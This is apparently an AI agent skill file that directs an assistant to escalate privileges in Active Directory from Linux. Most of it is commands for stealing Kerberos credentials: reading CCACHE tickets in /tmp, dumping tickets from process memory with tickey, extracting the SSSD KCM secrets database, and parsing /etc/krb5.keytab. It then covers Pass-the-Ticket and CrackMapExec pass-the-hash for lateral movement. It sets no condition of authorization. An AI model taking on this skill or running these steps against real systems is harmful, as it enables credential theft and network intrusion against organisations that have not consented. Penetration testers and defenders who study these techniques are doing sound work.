---
name: linux-ad-privilege-escalation
description: How to enumerate Active Directory from Linux and extract Kerberos tickets for privilege escalation. Use this skill whenever the user mentions Linux machines in AD environments, Kerberos tickets, CCACHE files, keytabs, FreeIPA, or wants to perform Pass-the-Ticket attacks from Linux. This includes finding tickets in /tmp, extracting from keyring, SSSD KCM, or keytab files.
---

# Linux Active Directory Privilege Escalation

This skill helps you enumerate Active Directory from Linux systems and extract Kerberos tickets for privilege escalation attacks.

## When to Use This Skill

Use this skill when:
- You have access to a Linux machine that may be joined to Active Directory
- You need to find or extract Kerberos tickets from a Linux system
- You're working with FreeIPA environments
- You want to perform Pass-the-Ticket attacks from Linux
- You need to parse keytab files or extract credentials from SSSD

## Quick Start

```bash
# Check if machine is AD-joined
env | grep KRB5CCNAME
ls /tmp/ | grep krb5cc

# List current tickets
klist
```

## Enumeration

### AD Enumeration from Linux

If you have access to an AD environment from Linux (or bash in Windows), you can use enumeration tools:

1. **linWinPwn** - Comprehensive AD enumeration tool
   ```bash
   git clone https://github.com/lefayjey/linWinPwn
   ```

2. **LDAP Enumeration** - Use standard LDAP tools to enumerate the directory

### FreeIPA Detection

FreeIPA is an open-source alternative to Microsoft Active Directory for Unix environments. Check for FreeIPA:

```bash
# Check if FreeIPA is installed
which ipa
ls /etc/ipa/
```

## Finding Kerberos Tickets

### Method 1: CCACHE Tickets in /tmp

CCACHE files store Kerberos credentials and are typically in `/tmp` with 600 permissions.

**Use the script:**
```bash
./scripts/find_ccache_tickets.sh
```

**Manual approach:**
```bash
# Find tickets
ls /tmp/ | grep krb5cc

# Check current ticket
env | grep KRB5CCNAME

# Use a specific ticket
export KRB5CCNAME=/tmp/krb5cc_1000
klist
```

### Method 2: Extract from Keyring (Memory)

Kerberos tickets in process memory can be extracted if ptrace protection is disabled.

**Check ptrace protection:**
```bash
cat /proc/sys/kernel/yama/ptrace_scope
# 0 = disabled (can extract), 1-3 = restricted
```

**Use the script:**
```bash
./scripts/extract_keyring_tickets.sh
```

**Manual approach with tickey:**
```bash
git clone https://github.com/TarlogicSecurity/tickey
cd tickey/tickey
make CONF=Release
/tmp/tickey -i
# Extracted tickets saved as __krb_UID.ccache in /tmp
```

### Method 3: SSSD KCM Extraction

SSSD stores credentials in a database that can be extracted with root access.

**Use the script:**
```bash
./scripts/extract_sssd_kcm.sh
```

**Manual approach:**
```bash
git clone https://github.com/fireeye/SSSDKCMExtractor
cd SSSDKCMExtractor
python3 SSSDKCMExtractor.py \
  --database /var/lib/sss/secrets/secrets.ldb \
  --key /var/lib/sss/secrets/.secrets.mkey
```

### Method 4: Keytab Files

Keytab files contain service account keys, often at `/etc/krb5.keytab`.

**Use the script:**
```bash
./scripts/parse_keytab.sh /etc/krb5.keytab
```

**Manual approaches:**

**Linux - KeyTabExtract:**
```bash
git clone https://github.com/its-a-feature/KeytabParser
cd KeytabParser
python3 KeytabParser.py /etc/krb5.keytab
```

**Linux - klist:**
```bash
klist -k /etc/krb5.keytab
```

**macOS - bifrost:**
```bash
./bifrost -action dump -source keytab -path /path/to/keytab
```

## Using Extracted Credentials

### Pass-the-Ticket

Once you have a CCACHE ticket, you can use it for Pass-the-Ticket attacks:

```bash
# Set the ticket
export KRB5CCNAME=/tmp/extracted_ticket.ccache

# Verify it works
klist

# Use with tools like Impacket
kinit -c /tmp/extracted_ticket.ccache
```

### CrackMapExec with Extracted Hash

If you extracted an NT hash from a keytab:

```bash
crackmapexec smb 10.XXX.XXX.XXX \
  -u 'ServiceAccount$' \
  -H 'extracted_hash' \
  -d 'YourDOMAIN'
```

## Workflow Summary

1. **Enumerate** - Check if machine is AD-joined, find ticket locations
2. **Extract** - Use appropriate method based on what you find:
   - `/tmp/krb5cc_*` files → Use directly
   - Process memory → Use tickey
   - SSSD database → Use SSSDKCMExtractor
   - Keytab files → Use KeytabParser
3. **Convert** - Convert to usable format if needed
4. **Exploit** - Use tickets for Pass-the-Ticket or hash for lateral movement

## Important Notes

- **Root access** is often required for SSSD extraction and reading other users' tickets
- **ptrace_scope** must be 0 for memory extraction to work
- CCACHE ticket format is `krb5cc_%{uid}` where uid is the user's UID
- Keytab files may contain multiple service account keys
- Extracted credentials should be used immediately as tickets expire

## References

- [Tarlogic - How to Attack Kerberos](https://www.tarlogic.com/blog/how-to-attack-kerberos/)
- [tickey - Kerberos ticket extraction](https://github.com/TarlogicSecurity/tickey)
- [SSSDKCMExtractor - SSSD credential extraction](https://github.com/fireeye/SSSDKCMExtractor)
- [KeytabParser - Keytab file parsing](https://github.com/its-a-feature/KeytabParser)
- [PayloadsAllTheThings - AD Attack](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Active%20Directory%20Attack.md#linux-active-directory)
